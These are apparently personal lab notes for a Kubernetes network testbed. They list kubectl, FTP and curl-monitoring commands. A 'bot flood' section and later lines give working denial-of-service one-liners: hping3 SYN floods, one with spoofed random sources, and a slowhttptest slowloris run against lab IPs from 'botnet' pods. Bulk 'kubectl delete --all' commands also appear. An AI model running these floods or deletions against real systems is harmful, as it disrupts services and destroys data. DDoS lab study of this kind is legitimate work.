kubectl
```bash
kubectl get persistentvolumeclaims
kubectl api-resources

kubectl delete pods --all
kubectl delete deployments --all
kubectl cp -c tcpdump server:/app/graficos/bandwidth_server.pcap.png ./graficos/teste.png > /dev/null 2>&1
```

ftp
```bash
curl ftp://200.130.75.91:8210/ --user $FTP_LOGIN:$FTP_PWD
```

client monitoring
```bash
echo "
     time_namelookup:  %{time_namelookup}s\n
        time_connect:  %{time_connect}s\n
     time_appconnect:  %{time_appconnect}s\n
    time_pretransfer:  %{time_pretransfer}s\n
       time_redirect:  %{time_redirect}s\n
  time_starttransfer:  %{time_starttransfer}s\n
                     ----------\n
          time_total:  %{time_total}s\n
" > curl-format.txt
apk add curl
watch "curl -w '@curl-format.txt' -o /dev/null -s $SERVER; curl $SERVER"
```

bot flood
```bash
hping3 -S --flood -V -p 80 10.1.1.175
slowhttptest -c 1100 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.1.1.175 -x 24 -p 3
```



knetlab
```bash
kubectl port-forward knetlab-operator-768cdc5759-78cnb 8080:8080 --address 0.0.0.0 # Port MUST BE 8080
ifconfig to-pa 192.168.10.2 netmask 255.255.255.0 up # Static IP
kubectl exec --stdin --tty $(kubectl get pod -l device=server -o jsonpath="{.items[0].metadata.name}") -- "/bin/bash"
tcpdump -i any -w topa.pcap
kubectl exec --stdin --tty $(kubectl get pod -l device=botnet -o jsonpath="{.items[0].metadata.name}") -- "/bin/bash"
kubectl exec --stdin --tty $(kubectl get pod -l device=botnet2 -o jsonpath="{.items[0].metadata.name}") -- "/bin/bash"
kubectl exec --stdin --tty $(kubectl get pod -l device=botnet3 -o jsonpath="{.items[0].metadata.name}") -- "/bin/bash"
hping3 --rand-source -I to-df --flood $SERVER
```
